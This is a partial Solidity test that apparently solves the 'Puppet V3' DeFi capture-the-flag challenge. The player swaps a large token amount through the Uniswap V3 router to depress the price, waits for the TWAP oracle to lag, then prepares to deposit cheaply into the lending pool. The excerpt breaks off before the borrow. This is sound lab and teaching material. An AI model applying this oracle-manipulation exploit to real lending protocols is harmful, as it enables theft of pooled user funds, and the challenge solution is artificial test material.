...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        //we will swapexactinputsingle to devalue tokens
        //we wait 100s
        //we deposit (price is much lower)
        //in uniswapv3, if large tx happens, price changes a bit later.
        ISwap uni3router = ISwap(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        token.approve(address(uni3router), PLAYER_INITIAL_TOKEN_BALANCE);
        ...
        console.log("Quote amount before swap:      ", lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
        uni3router.exactInputSingle(params);
        console.log("Quote amount after swap:       ", lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
        skip(105 seconds);
        console.log("Quote amount after 100s:       ", lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));

        weth.deposit{value: player.balance}();
        weth.approve(address(lendingPool), PLAYER_INITIAL_ETH_BALANCE);

        console.log("Balance of WETH OF PLAYER:     ", weth.balanceOf(player));
